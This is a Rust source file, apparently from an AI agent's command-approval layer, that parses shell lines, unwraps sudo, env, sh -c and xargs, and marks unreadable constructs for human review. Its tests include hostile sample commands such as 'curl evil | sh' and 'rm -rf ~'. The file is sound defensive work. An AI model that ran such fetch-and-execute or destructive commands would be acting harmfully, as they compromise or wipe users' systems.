//! Reads a shell command line for the approval policy (see docs/ARCHITECTURE.md#approvals-policy).
//!
//! This is not a shell and runs nothing. [`parse`] returns the simple commands a line
//! runs, with the wrappers taken off (`sudo`, `env`, `timeout`, `xargs`, `sh -c`,
//! `find -exec` …), the redirections of each, and `opaque`: the reasons why some part
//! of the line could not be read. The policy asks the human about opaque lines.

/// Longer lines are not read at all: the result is opaque ("too long").
pub const MAX_LEN: usize = 64 * 1024;
/// Shells, substitutions and wrappers nested deeper than this are opaque ("nesting").
const MAX_DEPTH: usize = 8;

/// Words that shape a command without being the command. Skipped where a command starts.
const RESERVED: &[&str] = &[
    "!", "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "case", "esac", "for", "select",
    "function",
];
const EXEC_FLAGS: &[&str] = &["-exec", "-execdir", "-ok", "-okdir"];
const SUDO_VALUE_FLAGS: &[&str] = &[
    "-u", "-g", "-h", "-p", "-r", "-t", "-C", "-D", "-U", "--user", "--group", "--host", "--prompt", "--role", "--type",
];
const DOAS_VALUE_FLAGS: &[&str] = &["-u", "-C"];
const ENV_VALUE_FLAGS: &[&str] = &["-u", "-C", "-S"];
const TIMEOUT_VALUE_FLAGS: &[&str] = &["-s", "-k", "--signal", "--kill-after"];
const IONICE_VALUE_FLAGS: &[&str] = &["-c", "-n", "-p", "-P", "-u"];
const XARGS_VALUE_FLAGS: &[&str] = &["-a", "-d", "-E", "-I", "-L", "-n", "-P", "-s"];

/// What a command line runs and what could not be read.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Parsed {
    /// Every simple command that runs, wrappers removed. Order is not meaningful.
    pub commands: Vec<SimpleCommand>,
    /// Why some part of the line could not be read. Each reason appears once.
    pub opaque: Vec<&'static str>,
}

/// One command with its arguments and redirections.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SimpleCommand {
    /// Program name (basename, so `/usr/bin/rm` is `rm`) and arguments, quotes removed.
    /// Empty for a line that only redirects.
    pub argv: Vec<String>,
    /// The program as written, before the basename was taken (`/usr/bin/rm`). Empty when `argv` is.
    pub program: String,
    pub redirects: Vec<Redirect>,
    /// The arguments come from input through `xargs`, not from the line.
    pub via_xargs: bool,
    /// `find … -delete`.
    pub find_delete: bool,
    /// `find … -exec`, `-execdir`, `-ok` or `-okdir`.
    pub find_exec: bool,
}

/// A redirection. `op` is the operator with its descriptor: `>`, `>>`, `<`, `>|`, `&>`,
/// `&>>`, `<>`, `2>`, `2>>`, …. Descriptor duplications (`2>&1`) keep `>&` / `<&` and
/// a descriptor number (or `-`) as the target; they name no file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    pub op: String,
    pub target: String,
}

impl Redirect {
    /// True for a descriptor duplication (`2>&1`, `<&0`): its target is a descriptor, not a file.
    pub fn is_duplication(&self) -> bool {
        self.op.ends_with(">&") || self.op.ends_with("<&")
    }

    /// True for a redirection that names a file the command may write (`<` only reads).
    pub fn writes_file(&self) -> bool {
        self.op != "<" && !self.is_duplication()
    }
}

impl Parsed {
    fn note(&mut self, why: &'static str) {
        if !self.opaque.contains(&why) {
            self.opaque.push(why);
        }
    }
}

/// Reads a command line. Never fails: what it cannot read is listed in `opaque`.
pub fn parse(cmd: &str) -> Parsed {
    parse_at(cmd, 0)
}

fn parse_at(cmd: &str, depth: usize) -> Parsed {
    if depth > MAX_DEPTH {
        let mut out = Parsed::default();
        out.note("nesting");
        return out;
    }
    if cmd.len() > MAX_LEN {
        let mut out = Parsed::default();
        out.note("too long");
        return out;
    }
    let mut lexer = Lexer::new(cmd, depth);
    let tokens = lexer.run();
    let mut out = lexer.out;
    for raw in build(&tokens) {
        let ctx = Ctx {
            depth,
            via_xargs: false,
            piped: raw.piped,
        };
        normalize(&raw.argv, &raw.redirects, ctx, &mut out);
    }
    out
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Tok {
    /// `quoted` when any part was quoted or escaped: such a word is never a keyword.
    Word { text: String, quoted: bool },
    /// `&&`, `||`, `;`, `&`, `|`, `|&`, `(`, `)`, a newline. A bare `{` or `}` is also `;`.
    Op(&'static str),
    /// A redirection. Its target is the next word. `fd` holds the digits before it, or "".
    Redir { fd: String, op: &'static str },
    /// A heredoc or here-string. Its body is skipped; it has no target word.
    Heredoc,
}

struct Lexer {
    chars: Vec<char>,
    pos: usize,
    depth: usize,
    stop: bool,
    /// Heredoc delimiters whose bodies start on the next line: (word, `<<-` strips tabs).
    heredocs: Vec<(String, bool)>,
    /// Commands from substitutions, already normalized, and the reasons found so far.
    out: Parsed,
}

impl Lexer {
    fn new(cmd: &str, depth: usize) -> Self {
        Self {
            chars: cmd.chars().collect(),
            pos: 0,
            depth,
            stop: false,
            heredocs: Vec::new(),
            out: Parsed::default(),
        }
    }

    fn peek(&self, ahead: usize) -> Option<char> {
        self.chars.get(self.pos + ahead).copied()
    }

    fn bump(&mut self) -> Option<char> {
        let c = self.peek(0)?;
        self.pos += 1;
        Some(c)
    }

    fn note(&mut self, why: &'static str) {
        self.out.note(why);
    }

    fn run(&mut self) -> Vec<Tok> {
        let mut toks = Vec::new();
        while !self.stop {
            self.skip_blanks();
            let Some(c) = self.peek(0) else { break };
            let next = self.peek(1);
            match c {
                '\n' => {
                    self.pos += 1;
                    toks.push(Tok::Op("\n"));
                    self.skip_heredoc_bodies();
                }
                '#' => self.skip_comment(),
                ';' => {
                    self.pos += if next == Some(';') { 2 } else { 1 };
                    toks.push(Tok::Op(";"));
                }
                '&' if next == Some('&') => {
                    self.pos += 2;
                    toks.push(Tok::Op("&&"));
                }
                '&' if next == Some('>') => {
                    let op = if self.peek(2) == Some('>') {
                        self.pos += 3;
                        "&>>"
                    } else {
                        self.pos += 2;
                        "&>"
                    };
                    toks.push(Tok::Redir { fd: String::new(), op });
                }
                '&' => {
                    self.pos += 1;
                    toks.push(Tok::Op("&"));
                }
                '|' if next == Some('|') => {
                    self.pos += 2;
                    toks.push(Tok::Op("||"));
                }
                '|' if next == Some('&') => {
                    self.pos += 2;
                    toks.push(Tok::Op("|&"));
                }
                '|' => {
                    self.pos += 1;
                    toks.push(Tok::Op("|"));
                }
                '(' => {
                    self.pos += 1;
                    toks.push(Tok::Op("("));
                }
                ')' => {
                    self.pos += 1;
                    toks.push(Tok::Op(")"));
                }
                '<' | '>' => self.redirect(String::new(), &mut toks),
                _ if c.is_ascii_digit() && self.fd_digits() > 0 => {
                    let n = self.fd_digits();
                    let fd: String = self.chars[self.pos..self.pos + n].iter().collect();
                    self.pos += n;
                    self.redirect(fd, &mut toks);
                }
                _ => {
                    let start = self.pos;
                    let (text, quoted) = self.word();
                    if self.pos == start {
                        self.pos += 1;
                        continue;
                    }
                    if !quoted && (text == "{" || text == "}") {
                        toks.push(Tok::Op(";"));
                    } else if quoted || !text.is_empty() {
                        toks.push(Tok::Word { text, quoted });
                    }
                }
            }
        }
        toks
    }

    /// Number of digits at the position when a redirection follows them directly; else 0.
    fn fd_digits(&self) -> usize {
        let digits = self.chars[self.pos..].iter().take_while(|c| c.is_ascii_digit()).count();
        match self.chars.get(self.pos + digits) {
            Some('<' | '>') => digits,
            _ => 0,
        }
    }

    fn skip_blanks(&mut self) {
        while matches!(self.peek(0), Some(' ' | '\t' | '\r')) {
            self.pos += 1;
        }
    }

    fn skip_comment(&mut self) {
        while !matches!(self.peek(0), None | Some('\n')) {
            self.pos += 1;
        }
    }

    /// At `<` or `>` (after an optional descriptor): reads the operator and pushes it.
    fn redirect(&mut self, fd: String, toks: &mut Vec<Tok>) {
        let c = self.chars[self.pos];
        let next = self.peek(1);
        if fd.is_empty() && next == Some('(') {
            // `<(…)` and `>(…)`: a process substitution. Its output is a path, so it stands as a word.
            self.pos += 2;
            if let Some(inner) = self.extract_paren() {
                self.note("process substitution");
                self.nested(&inner);
            }
            toks.push(Tok::Word {
                text: format!("{c}()"),
                quoted: true,
            });
            return;
        }
        let op: &'static str = match (c, next) {
            ('<', Some('<')) => {
                if self.peek(2) == Some('<') {
                    // here-string: its word is data, not a command
                    self.pos += 3;
                    self.skip_blanks();
                    let _ = self.word();
                } else {
                    self.pos += 2;
                    let strip = self.peek(0) == Some('-');
                    if strip {
                        self.pos += 1;
                    }
                    self.skip_blanks();
                    let (delim, _) = self.word();
                    self.heredocs.push((delim, strip));
                }
                self.note("heredoc");
                toks.push(Tok::Heredoc);
                return;
            }
            ('<', Some('>')) => {
                self.pos += 2;
                "<>"
            }
            ('<', Some('&')) => {
                self.pos += 2;
                "<&"
            }
            ('<', _) => {
                self.pos += 1;
                "<"
            }
            (_, Some('>')) => {
                self.pos += 2;
                ">>"
            }
            (_, Some('|')) => {
                self.pos += 2;
                ">|"
            }
            (_, Some('&')) => {
                self.pos += 2;
                ">&"
            }
            _ => {
                self.pos += 1;
                ">"
            }
        };
        toks.push(Tok::Redir { fd, op });
    }

    /// Reads one word: quotes removed, `$(…)` and backticks read as commands. Stops at
    /// blanks and operators. Returns the text and whether any part was quoted.
    fn word(&mut self) -> (String, bool) {
        let mut text = String::new();
        let mut quoted = false;
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' | '\r' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' => break,
                '\\' => match self.peek(1) {
                    Some('\n') => self.pos += 2,
                    Some(next) => {
                        text.push(next);
                        quoted = true;
                        self.pos += 2;
                    }
                    None => {
                        text.push('\\');
                        quoted = true;
                        self.pos += 1;
                    }
                },
                '\'' => {
                    quoted = true;
                    self.pos += 1;
                    loop {
                        match self.bump() {
                            Some('\'') => break,
                            Some(ch) => text.push(ch),
                            None => {
                                self.note("unclosed quote");
                                self.stop = true;
                                return (text, quoted);
                            }
                        }
                    }
                }
                '"' => {
                    quoted = true;
                    self.pos += 1;
                    if !self.double_quoted(&mut text) {
                        return (text, quoted);
                    }
                }
                '$' if self.peek(1) == Some('(') => {
                    quoted = true;
                    self.pos += 2;
                    self.substitution(&mut text);
                }
                '`' => {
                    quoted = true;
                    self.pos += 1;
                    self.backticks(&mut text);
                }
                _ => {
                    text.push(c);
                    self.pos += 1;
                }
            }
        }
        (text, quoted)
    }

    /// Reads a double-quoted part (after the opening quote). False when it is not closed.
    fn double_quoted(&mut self, text: &mut String) -> bool {
        loop {
            match self.peek(0) {
                None => {
                    self.note("unclosed quote");
                    self.stop = true;
                    return false;
                }
                Some('"') => {
                    self.pos += 1;
                    return true;
                }
                Some('\\') => match self.peek(1) {
                    Some(c @ ('"' | '\\' | '$' | '`')) => {
                        text.push(c);
                        self.pos += 2;
                    }
                    Some('\n') => self.pos += 2,
                    _ => {
                        text.push('\\');
                        self.pos += 1;
                    }
                },
                Some('$') if self.peek(1) == Some('(') => {
                    self.pos += 2;
                    self.substitution(text);
                }
                Some('`') => {
                    self.pos += 1;
                    self.backticks(text);
                }
                Some(c) => {
                    text.push(c);
                    self.pos += 1;
                }
            }
        }
    }

    /// After `$(`: reads the command up to its closing parenthesis and parses it.
    fn substitution(&mut self, text: &mut String) {
        if let Some(inner) = self.extract_paren() {
            self.note("command substitution");
            self.nested(&inner);
            text.push_str("$(");
            text.push_str(&inner);
            text.push(')');
        }
    }

    /// After an opening parenthesis: the text up to the matching `)`. Quotes and escapes
    /// inside are skipped over. None (and the rest of the line is opaque) when it never closes.
    fn extract_paren(&mut self) -> Option<String> {
        let start = self.pos;
        let len = self.chars.len();
        let mut depth = 1usize;
        let mut i = start;
        while i < len {
            match self.chars[i] {
                '\\' => i += 1,
                '\'' => {
                    i += 1;
                    while i < len && self.chars[i] != '\'' {
                        i += 1;
                    }
                }
                '"' => {
                    i += 1;
                    while i < len && self.chars[i] != '"' {
                        if self.chars[i] == '\\' {
                            i += 1;
                        }
                        i += 1;
                    }
                }
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        self.pos = i + 1;
                        return Some(self.chars[start..i].iter().collect());
                    }
                }
                _ => {}
            }
            i += 1;
        }
        self.pos = len;
        self.stop = true;
        self.note("unclosed substitution");
        None
    }

    /// After an opening backtick: reads up to the closing one and parses it.
    fn backticks(&mut self, text: &mut String) {
        let start = self.pos;
        let len = self.chars.len();
        let mut i = start;
        while i < len {
            match self.chars[i] {
                '\\' => i += 2,
                '`' => {
                    let inner: String = self.chars[start..i].iter().collect();
                    self.pos = i + 1;
                    self.note("backticks");
                    self.nested(&inner);
                    text.push('`');
                    text.push_str(&inner);
                    text.push('`');
                    return;
                }
                _ => i += 1,
            }
        }
        self.pos = len;
        self.stop = true;
        self.note("unclosed backticks");
    }

    /// Parses text that a substitution runs and keeps its commands.
    fn nested(&mut self, inner: &str) {
        let parsed = parse_at(inner, self.depth + 1);
        merge(&mut self.out, parsed, &[]);
    }

    /// Skips the bodies of the heredocs opened on the line that just ended.
    fn skip_heredoc_bodies(&mut self) {
        for (delim, strip) in std::mem::take(&mut self.heredocs) {
            loop {
                if self.pos >= self.chars.len() {
                    break;
                }
                let start = self.pos;
                while self.pos < self.chars.len() && self.chars[self.pos] != '\n' {
                    self.pos += 1;
                }
                let line: String = self.chars[start..self.pos].iter().collect();
                if self.pos < self.chars.len() {
                    self.pos += 1;
                }
                let line = line.trim_end_matches('\r');
                let line = if strip { line.trim_start_matches('\t') } else { line };
                if line == delim {
                    break;
                }
            }
        }
    }
}

/// A simple command as the parser found it, before wrappers are taken off.
#[derive(Debug, Default)]
struct Raw {
    argv: Vec<String>,
    redirects: Vec<Redirect>,
    /// Fed by a pipe (`… | this`).
    piped: bool,
}

impl Raw {
    fn is_empty(&self) -> bool {
        self.argv.is_empty() && self.redirects.is_empty()
    }
}

/// Groups tokens into simple commands, split at operators.
fn build(tokens: &[Tok]) -> Vec<Raw> {
    let mut raws = Vec::new();
    let mut cur = Raw::default();
    let mut i = 0;
    while i < tokens.len() {
        match &tokens[i] {
            Tok::Op(op) => {
                let piped = matches!(*op, "|" | "|&");
                if !cur.is_empty() {
                    raws.push(std::mem::take(&mut cur));
                }
                cur.piped = piped;
            }
            Tok::Heredoc => {}
            Tok::Redir { fd, op } => {
                let target = match tokens.get(i + 1) {
                    Some(Tok::Word { text, .. }) => {
                        i += 1;
                        Some(text.clone())
                    }
                    _ => None,
                };
                if let Some(target) = target {
                    cur.redirects.push(redirect(fd, op, target));
                }
            }
            Tok::Word { text, quoted } => {
                if !(cur.argv.is_empty() && !quoted && RESERVED.contains(&text.as_str())) {
                    cur.argv.push(text.clone());
                }
            }
        }
        i += 1;
    }
    if !cur.is_empty() {
        raws.push(cur);
    }
    raws
}

/// Builds a redirection. `>&word` (not a descriptor) writes a file, as `&>` does.
fn redirect(fd: &str, op: &str, target: String) -> Redirect {
    let is_descriptor = (!target.is_empty() && target.bytes().all(|b| b.is_ascii_digit())) || target == "-";
    if (op == ">&" || op == "<&") && is_descriptor {
        return Redirect {
            op: format!("{fd}{op}"),
            target,
        };
    }
    let op = match op {
        ">&" if fd.is_empty() => "&>",
        ">&" => ">",
        "<&" => "<",
        other => other,
    };
    Redirect {
        op: format!("{fd}{op}"),
        target,
    }
}

#[derive(Debug, Clone, Copy)]
struct Ctx {
    depth: usize,
    /// Inside an `xargs` call: the arguments come from input.
    via_xargs: bool,
    /// Fed by a pipe.
    piped: bool,
}

/// Takes wrappers off one command and pushes what it really runs.
fn normalize(argv: &[String], redirects: &[Redirect], ctx: Ctx, out: &mut Parsed) {
    if ctx.depth > MAX_DEPTH {
        out.note("nesting");
        return;
    }
    let argv = &argv[argv.iter().take_while(|w| is_assignment(w)).count()..];
    let Some(program) = argv.first() else {
        if !redirects.is_empty() {
            out.commands.push(SimpleCommand {
                redirects: redirects.to_vec(),
                via_xargs: ctx.via_xargs,
                ..SimpleCommand::default()
            });
        }
        return;
    };
    if program.starts_with('$') {
        out.note("variable command");
    }
    if program.contains(['*', '?', '[']) {
        out.note("glob command");
    }
    let name = basename(program);
    let rest = &argv[1..];
    let inner = Ctx {
        depth: ctx.depth + 1,
        ..ctx
    };
    match name {
        "eval" => out.note("eval"),
        "source" | "." => out.note("source"),
        _ => {}
    }
    match name {
        "sudo" => normalize(&rest[after_options(rest, SUDO_VALUE_FLAGS)..], redirects, inner, out),
        "doas" => normalize(&rest[after_options(rest, DOAS_VALUE_FLAGS)..], redirects, inner, out),
        "env" => {
            if rest.iter().any(|a| a.starts_with("-S")) {
                out.note("env -S");
            }
            let mut i = after_options(rest, ENV_VALUE_FLAGS);
            while i < rest.len() && is_assignment(&rest[i]) {
                i += 1;
            }
            normalize(&rest[i..], redirects, inner, out);
        }
        "nice" => normalize(&rest[after_options(rest, &["-n"])..], redirects, inner, out),
        "nohup" | "setsid" | "unbuffer" | "command" | "builtin" => {
            normalize(&rest[after_options(rest, &[])..], redirects, inner, out)
        }
        "exec" => normalize(&rest[after_options(rest, &["-a"])..], redirects, inner, out),
        "time" => normalize(&rest[after_options(rest, &["-f", "-o"])..], redirects, inner, out),
        "timeout" => normalize(
            &rest[skip_one(rest, after_options(rest, TIMEOUT_VALUE_FLAGS))..],
            redirects,
            inner,
            out,
        ),
        "stdbuf" => normalize(&rest[after_options(rest, &["-i", "-o", "-e"])..], redirects, inner, out),
        "ionice" => normalize(&rest[after_options(rest, IONICE_VALUE_FLAGS)..], redirects, inner, out),
        "chrt" | "taskset" => normalize(&rest[skip_one(rest, after_options(rest, &[]))..], redirects, inner, out),
        "xargs" => {
            let xargs = Ctx {
                via_xargs: true,
                piped: false,
                ..inner
            };
            normalize(&rest[after_options(rest, XARGS_VALUE_FLAGS)..], redirects, xargs, out);
        }
        "find" => find(name, program, rest, redirects, ctx, out),
        "sh" | "bash" | "zsh" | "dash" | "ksh" => match shell_script(rest) {
            Some(script) => merge(out, parse_at(script, ctx.depth + 1), redirects),
            None => push_plain(name, program, rest, redirects, ctx, out),
        },
        _ => push_plain(name, program, rest, redirects, ctx, out),
    }
}

/// `find`: the call itself (with `-delete` / `-exec` flags) and the commands its `-exec` runs.
fn find(name: &str, program: &str, rest: &[String], redirects: &[Redirect], ctx: Ctx, out: &mut Parsed) {
    out.commands.push(SimpleCommand {
        argv: with_name(name, rest),
        program: program.to_string(),
        redirects: redirects.to_vec(),
        via_xargs: ctx.via_xargs,
        find_delete: rest.iter().any(|a| a == "-delete"),
        find_exec: rest.iter().any(|a| EXEC_FLAGS.contains(&a.as_str())),
    });
    let inner = Ctx {
        depth: ctx.depth + 1,
        via_xargs: false,
        piped: false,
    };
    let mut i = 0;
    while i < rest.len() {
        if EXEC_FLAGS.contains(&rest[i].as_str()) {
            let start = i + 1;
            let mut end = start;
            while end < rest.len() && rest[end] != ";" && rest[end] != "+" {
                end += 1;
            }
            normalize(&rest[start..end], redirects, inner, out);
            i = end + 1;
        } else {
            i += 1;
        }
    }
}

/// A command that is not a wrapper. Notes what an interpreter fed by a pipe or xargs would run.
fn push_plain(name: &str, program: &str, rest: &[String], redirects: &[Redirect], ctx: Ctx, out: &mut Parsed) {
    if (ctx.piped || ctx.via_xargs) && is_interpreter(name) {
        if rest.iter().all(|a| a.starts_with('-')) {
            out.note("stdin into interpreter");
        } else if !is_shell(name) && rest.iter().any(|a| matches!(a.as_str(), "-c" | "-e" | "-E" | "--eval")) {
            out.note("inline code from a pipe");
        }
    }
    out.commands.push(SimpleCommand {
        argv: with_name(name, rest),
        program: program.to_string(),
        redirects: redirects.to_vec(),
        via_xargs: ctx.via_xargs,
        find_delete: false,
        find_exec: false,
    });
}

fn with_name(name: &str, rest: &[String]) -> Vec<String> {
    let mut argv = Vec::with_capacity(rest.len() + 1);
    argv.push(name.to_string());
    argv.extend(rest.iter().cloned());
    argv
}

/// For `sh -c SCRIPT` (options such as `-lc`, `-e -c`, `-o pipefail -c` allowed): the script.
fn shell_script(rest: &[String]) -> Option<&str> {
    let mut i = 0;
    while i < rest.len() {
        let a = rest[i].as_str();
        if a == "-c" || (a.len() > 1 && a.starts_with('-') && !a.starts_with("--") && a[1..].contains('c')) {
            return rest.get(i + 1).map(String::as_str);
        }
        if matches!(a, "-o" | "+o" | "-O" | "+O") {
            i += 2;
        } else if (a.starts_with('-') || a.starts_with('+')) && a.len() > 1 && a != "--" {
            i += 1;
        } else {
            return None;
        }
    }
    None
}

/// Index of the first word after a wrapper's options. `value_flags` take the next word as their value.
fn after_options(args: &[String], value_flags: &[&str]) -> usize {
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            return i + 1;
        }
        if a.len() < 2 || !a.starts_with('-') {
            return i;
        }
        i += if value_flags.contains(&a) { 2 } else { 1 };
    }
    i
}

/// One more positional word (a duration, a mask, a priority) after the options.
fn skip_one(args: &[String], index: usize) -> usize {
    (index + 1).min(args.len())
}

/// Commands from a parsed script join the outer command: the outer redirections apply to them too.
fn merge(out: &mut Parsed, inner: Parsed, redirects: &[Redirect]) {
    for mut cmd in inner.commands {
        cmd.redirects.extend(redirects.iter().cloned());
        out.commands.push(cmd);
    }
    for why in inner.opaque {
        out.note(why);
    }
}

fn basename(program: &str) -> &str {
    program.rsplit('/').next().unwrap_or(program)
}

/// `NAME=value` with a valid NAME: a shell assignment, not a command.
fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn is_shell(name: &str) -> bool {
    matches!(name, "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish")
}

/// Programs that run whatever they read: shells, Python, Perl, Ruby, Node.
fn is_interpreter(name: &str) -> bool {
    is_shell(name) || name.starts_with("python") || matches!(name, "perl" | "ruby" | "node")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn words(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    fn argvs(cmd: &str) -> Vec<Vec<String>> {
        parse(cmd).commands.into_iter().map(|c| c.argv).collect()
    }

    fn opaque(cmd: &str) -> Vec<&'static str> {
        parse(cmd).opaque
    }

    fn redirects(cmd: &str) -> Vec<(String, String)> {
        parse(cmd)
            .commands
            .into_iter()
            .flat_map(|c| c.redirects)
            .map(|r| (r.op, r.target))
            .collect()
    }

    #[test]
    fn splits_on_every_separator() {
        assert_eq!(
            argvs("a && b || c; d | e |& f & g\nh"),
            vec![
                words(&["a"]),
                words(&["b"]),
                words(&["c"]),
                words(&["d"]),
                words(&["e"]),
                words(&["f"]),
                words(&["g"]),
                words(&["h"]),
            ]
        );
    }

    #[test]
    fn single_quotes_are_literal() {
        assert_eq!(argvs("echo 'a $b \"c\"  d'"), vec![words(&["echo", "a $b \"c\"  d"])]);
    }

    #[test]
    fn double_quotes_keep_only_the_listed_escapes() {
        assert_eq!(
            argvs(r#"echo "a \"b\" \\ \$x \n""#),
            vec![words(&["echo", r#"a "b" \ $x \n"#])]
        );
    }

    #[test]
    fn backslash_outside_quotes_escapes_one_char() {
        assert_eq!(argvs(r"echo a\ b"), vec![words(&["echo", "a b"])]);
    }

    #[test]
    fn adjacent_parts_join_into_one_word() {
        assert_eq!(argvs("'r'm -rf x"), vec![words(&["rm", "-rf", "x"])]);
        assert_eq!(argvs(r#"/bin/r"m" x"#), vec![words(&["rm", "x"])]);
    }

    #[test]
    fn braces_and_parentheses_separate_commands() {
        assert_eq!(
            argvs("{ rm -rf x; } && (git push)"),
            vec![words(&["rm", "-rf", "x"]), words(&["git", "push"])]
        );
    }

    #[test]
    fn program_keeps_its_path_and_argv_gets_the_basename() {
        let cmd = &parse("/usr/bin/rm x").commands[0];
        assert_eq!(cmd.argv, words(&["rm", "x"]));
        assert_eq!(cmd.program, "/usr/bin/rm");
    }

    #[test]
    fn redirects_attached_and_separate() {
        assert_eq!(
            redirects("echo x >out.txt 2>> err.log"),
            vec![
                (">".to_string(), "out.txt".to_string()),
                ("2>>".to_string(), "err.log".to_string()),
            ]
        );
    }

    #[test]
    fn descriptor_duplication_is_not_a_file() {
        let r = &parse("cargo test 2>&1").commands[0].redirects;
        assert_eq!(
            r,
            &vec![Redirect {
                op: "2>&".into(),
                target: "1".into()
            }]
        );
        assert!(!r[0].writes_file());
    }

    #[test]
    fn ampersand_redirect_writes_both_streams() {
        assert_eq!(
            redirects("cmd &>out.log &>>more.log"),
            vec![
                ("&>".to_string(), "out.log".to_string()),
                ("&>>".to_string(), "more.log".to_string()),
            ]
        );
    }

    #[test]
    fn redirect_without_a_space_before_a_quoted_target() {
        assert_eq!(
            redirects(r#"echo x >"a b""#),
            vec![(">".to_string(), "a b".to_string())]
        );
    }

    #[test]
    fn heredoc_is_opaque_and_its_body_is_not_read() {
        let p = parse("cat <<EOF\nrm -rf ~\nEOF\necho ok");
        assert_eq!(p.opaque, vec!["heredoc"]);
        assert_eq!(
            p.commands.iter().map(|c| c.argv.clone()).collect::<Vec<_>>(),
            vec![words(&["cat"]), words(&["echo", "ok"])]
        );
    }

    #[test]
    fn indented_heredoc_delimiter_may_be_tab_indented() {
        let p = parse("cat <<-'X'\n\trm -rf ~\n\tX\nls");
        assert_eq!(p.opaque, vec!["heredoc"]);
        assert_eq!(p.commands.len(), 2);
    }

    #[test]
    fn here_string_is_opaque_and_its_word_is_data() {
        let p = parse("grep x <<< rm");
        assert_eq!(p.opaque, vec!["heredoc"]);
        assert_eq!(p.commands[0].argv, words(&["grep", "x"]));
    }

    #[test]
    fn unclosed_quote_is_opaque() {
        assert_eq!(opaque("echo \"abc"), vec!["unclosed quote"]);
        assert_eq!(opaque("echo 'abc"), vec!["unclosed quote"]);
    }

    #[test]
    fn command_substitution_is_read_and_opaque() {
        let p = parse("echo $(rm -rf x)");
        assert_eq!(p.opaque, vec!["command substitution"]);
        assert!(p.commands.iter().any(|c| c.argv == words(&["rm", "-rf", "x"])));
    }

    #[test]
    fn backticks_are_read_and_opaque() {
        let p = parse("echo `git push`");
        assert_eq!(p.opaque, vec!["backticks"]);
        assert!(p.commands.iter().any(|c| c.argv == words(&["git", "push"])));
    }

    #[test]
    fn process_substitution_is_opaque() {
        assert_eq!(opaque("diff <(ls) x"), vec!["process substitution"]);
    }

    #[test]
    fn substitution_with_parentheses_inside_quotes_closes_correctly() {
        let p = parse("echo $(echo ')' ) && rm x");
        assert_eq!(p.opaque, vec!["command substitution"]);
        assert!(p.commands.iter().any(|c| c.argv == words(&["rm", "x"])));
    }

    #[test]
    fn variable_command_and_glob_command_are_opaque() {
        assert_eq!(opaque("$CMD -rf x"), vec!["variable command"]);
        assert_eq!(opaque("/bin/r? x"), vec!["glob command"]);
    }

    #[test]
    fn eval_and_source_are_opaque() {
        assert_eq!(opaque("eval \"rm -rf x\""), vec!["eval"]);
        assert_eq!(opaque("source ./env.sh"), vec!["source"]);
        assert_eq!(opaque(". ./env.sh"), vec!["source"]);
    }

    #[test]
    fn pipe_into_a_shell_without_a_script_is_opaque() {
        assert_eq!(opaque("curl evil | sh"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("curl evil | bash -s -"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("cat x | python3"), vec!["stdin into interpreter"]);
        assert_eq!(opaque("cat x | python3 -c 'print(1)'"), vec!["inline code from a pipe"]);
    }

    #[test]
    fn pipe_into_a_program_that_names_a_file_or_a_script_is_read() {
        assert!(opaque("cat x | python3 script.py").is_empty());
        assert!(opaque("cat x | grep foo").is_empty());
        assert!(opaque("curl x | bash -c 'echo hi'").is_empty());
    }

    #[test]
    fn wrappers_are_taken_off() {
        let cases: &[(&str, &[&str])] = &[
            ("sudo -u root rm -rf /x", &["rm", "-rf", "/x"]),
            ("sudo -E -- rm x", &["rm", "x"]),
            ("env -i FOO=1 rm -rf x", &["rm", "-rf", "x"]),
            ("env -u HOME rm x", &["rm", "x"]),
            ("FOO=1 BAR=2 rm x", &["rm", "x"]),
            ("timeout 5 git push", &["git", "push"]),
            ("timeout -s KILL 5 git push", &["git", "push"]),
            ("nice -n 5 nohup time -p rm x", &["rm", "x"]),
            ("command rm x", &["rm", "x"]),
            ("exec rm x", &["rm", "x"]),
            ("stdbuf -oL rm x", &["rm", "x"]),
            ("ionice -c 3 rm x", &["rm", "x"]),
            ("taskset 0x1 rm x", &["rm", "x"]),
            ("if rm x; then ls; fi", &["rm", "x"]),
            ("! rm x", &["rm", "x"]),
        ];
        for (cmd, want) in cases {
            let got = argvs(cmd);
            assert!(got.contains(&words(want)), "{cmd}: {got:?}");
        }
    }

    #[test]
    fn xargs_marks_its_command() {
        let p = parse("find . | xargs -0 -I {} rm -rf {}");
        let rm = p.commands.iter().find(|c| c.argv[0] == "rm").expect("rm");
        assert!(rm.via_xargs);
        assert!(!p.commands.iter().any(|c| c.argv[0] == "find" && c.via_xargs));
    }

    #[test]
    fn xargs_into_a_shell_is_opaque() {
        assert_eq!(opaque("find . | xargs sh"), vec!["stdin into interpreter"]);
    }

    #[test]
    fn shell_dash_c_is_read_with_any_options() {
        let cases = [
            ("sh -lc \"rm -rf /tmp/x\"", vec!["rm", "-rf", "/tmp/x"]),
            ("bash -c 'git push origin'", vec!["git", "push", "origin"]),
            ("bash -e -c 'rm x'", vec!["rm", "x"]),
            ("bash -o pipefail -c 'rm x'", vec!["rm", "x"]),
        ];
        for (cmd, want) in cases {
            assert!(argvs(cmd).contains(&words(&want)), "{cmd}");
        }
    }

    #[test]
    fn shell_script_file_is_not_read() {
        let p = parse("bash ./deploy.sh");
        assert_eq!(p.commands[0].argv, words(&["bash", "./deploy.sh"]));
        assert!(p.opaque.is_empty());
    }

    #[test]
    fn find_exec_and_delete_are_read() {
        let p = parse("find /tmp -exec rm -rf {} +");
        assert!(p.commands.iter().any(|c| c.argv == words(&["rm", "-rf", "{}"])));
        assert!(p.commands.iter().any(|c| c.find_exec));
        let p = parse(r"find . -name x -exec echo {} \; -delete");
